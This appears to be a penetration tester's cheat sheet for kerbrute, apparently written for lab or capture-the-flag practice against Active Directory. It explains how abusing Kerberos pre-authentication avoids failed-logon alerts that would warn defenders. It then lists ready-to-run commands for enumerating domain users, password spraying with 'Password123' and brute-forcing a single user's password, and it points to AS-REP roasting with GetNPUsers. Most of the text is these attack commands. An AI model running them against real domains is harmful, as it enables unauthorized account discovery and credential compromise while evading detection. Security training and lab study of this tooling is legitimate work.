# kerbrute
Kerbrute is a popular enumeration tool used to brute-force and enumerate
valid active-directory users by abusing the Kerberos pre-authentication.


By brute-forcing Kerberos pre-authentication, you do not trigger the
account failed to log on event which can throw up red flags to blue
teams. When brute-forcing through Kerberos you can brute-force by only
sending a single UDP frame to the KDC allowing you to enumerate the
users on the domain from a wordlist.

Depending on the version it may have different options,
There is a go version and a python version.

The python version can be installed by doing:

    pip install kerbrute

The go version has static releases available at:
https://github.com/ropnop/kerbrute/releases


Note, to use the fo version you need to add the DNS domain name along
with the machine IP to /etc/hosts inside of your attacker machine or
these attacks will not work for you - 10.10.0.223  CONTROLLER.local


# Bruteforce/Spray with kerbrute (pip version)
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>

# Enumerate Users (pip version)
kerbrute -dc-ip 10.10.111.242 -domain spookysec.local -users userlist.txt -outputusers foundusers.txt 
;; here we can find if there are users who do not have PREAUTHENTICATION
;; to take advantage of preauthentication we must use impacket/examples/GetNPUsers.py.

# Enumerate Users (go version)
kerbrute userenum -d lab.example.com big_names_list.txt -o foundusers.txt
;; or
./kerbrute userenum --dc <ip_or_hostname_of_DC> -d <DOMAINNAMEWITHOUTTLD> users.txt -o foundusers.txt

# Password Spray (with Password123) (go version)
;; if it does not work try to remove the TLD, the ".com"
kerbrute passwordspray -d lab.example.com valid_domain_users.txt Password123 -o results.txt

# Password Bruteforce for a user(only if there is no lockout policy in place) (go version)
;; if it does not work try to remove the TLD, the ".com"
kerbrute bruteuser -d lab.example.com password_list.txt jsmith -o results.txt
